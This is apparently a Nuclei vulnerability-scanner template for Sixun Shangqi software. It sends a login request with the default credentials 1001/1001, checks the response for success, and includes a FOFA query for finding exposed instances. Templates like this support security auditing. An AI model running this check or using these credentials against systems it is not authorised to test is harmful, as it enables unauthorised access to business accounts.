id: sixun-Login-default-login

info:
  name: 思迅商旗 - default login
  author: msk
  severity: high
  description:
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: body="Content/mainFrame/index.css"
  tags: sixun,default-login

http:
  - raw:
      - |
        POST /api/Login/Login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        X-Requested-With: XMLHttpRequest
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Language: zh-CN,zh;q=0.9
        Content-Length: 38

        id=1001&password=1001&onlineQuery=true

    matchers:
      - type: dsl
        dsl:
          - status_code==200
          - contains_all(body,"true","success","lockLoginCode")
        condition: and